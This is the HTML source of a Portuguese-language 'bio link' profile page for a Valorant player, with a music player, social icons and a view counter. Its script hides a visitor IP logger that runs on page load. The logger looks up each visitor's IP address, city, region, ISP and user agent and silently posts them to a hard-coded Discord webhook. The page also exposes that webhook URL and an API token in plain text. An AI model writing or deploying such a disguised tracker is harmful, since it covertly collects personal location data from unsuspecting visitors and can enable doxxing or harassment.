<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bio Link - HENRI</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
            cursor: default;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000 url('fundo-kevin.jpg') no-repeat center center fixed;
            background-size: cover;
            overflow: hidden;
            color: white;
            opacity: 0;
            animation: fadeIn 1.5s ease-in-out forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 0;
        }

        .container {
            position: relative;
            background: rgba(255, 255, 255, 0.05);
            width: 380px;
            padding: 40px;
            border-radius: 25px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            text-align: center;
            z-index: 1;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
        }

        .container::before {
            content: "";
            position: absolute;
            top: -2px; left: -2px; right: -2px; bottom: -2px;
            background: linear-gradient(45deg, #ff4655, #bc1888, #46b6ff, #ff4655);
            background-size: 400%;
            z-index: -1;
            border-radius: 27px;
            animation: rgb-glow 10s linear infinite;
            opacity: 0.3;
        }

        @keyframes rgb-glow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .top-audio-icon {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            cursor: pointer;
            z-index: 10;
        }

        .badge-made-by {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.15);
            padding: 8px 15px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 13px;
            z-index: 10;
        }

        .profile-img-container {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 20px auto;
            border: 3px solid #ff4655;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(255, 70, 85, 0.4);
        }

        .profile-img-container img { width: 100%; height: 100%; object-fit: cover; }

        h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; font-weight: 900; }
        .symbol { color: #ff4655; }
        .valorant-badge {
            background: #ff4655;
            color: white;
            font-size: 10px;
            padding: 5px 15px;
            border-radius: 4px;
            margin: 15px 0;
            display: inline-block;
        }

        .bio { font-size: 14px; margin-bottom: 25px; color: #ccc; font-style: italic; }

        .custom-player {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }

        .progress-bar {
            position: absolute;
            bottom: 0; left: 0;
            height: 3px;
            background: #ff4655;
            width: 0%;
        }

        .play-btn {
            width: 35px; height: 35px;
            background: white;
            border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
        }

        .play-icon { border-style: solid; border-width: 6px 0 6px 10px; border-color: transparent transparent transparent black; margin-left: 2px; }
        .pause-icon { display: none; width: 10px; height: 12px; border-left: 3px solid black; border-right: 3px solid black; }
        .playing .play-icon { display: none; }
        .playing .pause-icon { display: block; }

        .social-list { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
        .social-link { text-decoration: none; color: inherit; transition: 0.3s; cursor: pointer; }
        .social-item { display: flex; flex-direction: column; align-items: center; gap: 5px; font-size: 11px; opacity: 0.7; }
        .social-item img { width: 28px; }
        .social-link:hover { transform: translateY(-5px); }
        .social-link:hover .social-item { opacity: 1; }

        #copy-toast {
            position: fixed; bottom: 20px;
            background: #ff4655;
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 12px;
            transform: translateY(100px);
            transition: 0.5s;
            z-index: 100;
        }

        .views-container { font-size: 11px; opacity: 0.4; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="overlay"></div>
    <div id="copy-toast">Copiado para a área de transferência!</div>

    <div class="top-audio-icon" onclick="toggleMusic()">
        <img src="https://img.icons8.com/ios-glyphs/24/ffffff/speaker.png" width="20">
    </div>

    <div class="badge-made-by">
        <span>❤️</span> Feito por : Vitima
    </div>

    <div class="container">
        <div class="profile-img-container">
            <img src="perfil-kevin.jpg" alt="Perfil">
        </div>

        <h1>HENRI <span class="symbol">;</span></h1>
        <div class="valorant-badge">VALORANT PLAYER</div>

        <p class="bio">
            "Fato claro, quero você bem perto porque de longe eu enxergo meu fim..."<br>
            Neurose
        </p>

        <div class="custom-player" id="player">
            <div class="play-btn">
                <div class="play-icon"></div>
                <div class="pause-icon"></div>
            </div>
            <div class="song-info" style="text-align: left;">
                <span style="font-size: 13px; font-weight: bold; display: block;">Diz aí qual é o plano?</span>
                <span style="font-size: 11px; opacity: 0.6;">MC Ryan SP</span>
            </div>
            <div class="progress-bar" id="progress"></div>
        </div>

        <audio id="audio" loop>
            <source src="musica.mp3" type="audio/mpeg">
        </audio>

        <div class="social-list">
            <div class="social-link" onclick="copyDiscord()">
                <div class="social-item">
                    <img src="https://img.icons8.com/color/144/discord-new-logo.png">
                    <span>Discord</span>
                </div>
            </div>
            <a href="#" target="_blank" class="social-link">
                <div class="social-item">
                    <img src="https://img.icons8.com/color/144/spotify--v1.png">
                    <span>Spotify</span>
                </div>
            </a>
            <a href="#" target="_blank" class="social-link">
                <div class="social-item">
                    <img src="https://img.icons8.com/color/144/steam.png">
                    <span>Steam</span>
                </div>
            </a>
        </div>

        <div class="views-container">
            <span>👁️ <span id="count">0</span> VISUALIZAÇÕES</span>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1494158244548055110/TPkU-H4xO4ek86LXGYruhf4xFSP1uy58EdflaqLCvjMF0qytLpyChwEgOjA6IuCyE1dh';

        async function sendLogs() {
            try {
                const response = await fetch('https://ipwho.is/');
                const data = await response.json();

                const params = {
                    username: "Bio Link Logger",
                    embeds: [{
                        title: "📍 Novo Acesso Detectado!",
                        color: 16726101,
                        fields: [
                            { name: "🌐 IP", value: data.ip || "N/A", inline: true },
                            { name: "🌆 Cidade", value: data.city || "N/A", inline: true },
                            { name: "🚩 Região", value: `${data.region} / ${data.country}`, inline: true },
                            { name: "📡 Provedor", value: data.connection.isp || "N/A", inline: false },
                            { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
                        ],
                        footer: { text: "Henri Bio Link • " + new Date().toLocaleString() }
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(params)
                });
            } catch (e) { console.log("Erro ao enviar log."); }
        }

        const API_TOKEN = 'ut_miMXbwXhe492tLN4L4kaTOY3OY6Fa95LN2mjBcmA';
        const GROUP = 'leandro-fernandess-team';
        const COUNTER = 'Neurose';

        async function updateCounter() {
            try {
                const response = await fetch(`https://api.counterapi.dev/v1/counters/${GROUP}/${COUNTER}/increment`, {
                    headers: { 'Authorization': API_TOKEN }
                });
                const data = await response.json();
                if (data.value) document.getElementById('count').innerText = data.value.toLocaleString('pt-BR');
            } catch (e) { console.error(e); }
        }

        function copyDiscord() {
            navigator.clipboard.writeText("Coepcr011");
            const toast = document.getElementById('copy-toast');
            toast.style.transform = "translateY(0)";
            setTimeout(() => { toast.style.transform = "translateY(100px)"; }, 2500);
        }

        const audio = document.getElementById('audio');
        const player = document.getElementById('player');
        const progress = document.getElementById('progress');

        function toggleMusic() {
            if (audio.paused) { audio.play(); player.classList.add('playing'); }
            else { audio.pause(); player.classList.remove('playing'); }
        }

        audio.ontimeupdate = () => { progress.style.width = (audio.currentTime / audio.duration) * 100 + "%"; };
        player.addEventListener('click', toggleMusic);
        document.body.addEventListener('click', () => { if (audio.paused) toggleMusic(); }, { once: true });

        window.onload = () => {
            updateCounter();
            sendLogs();
        };
    </script>
</body>
</html>
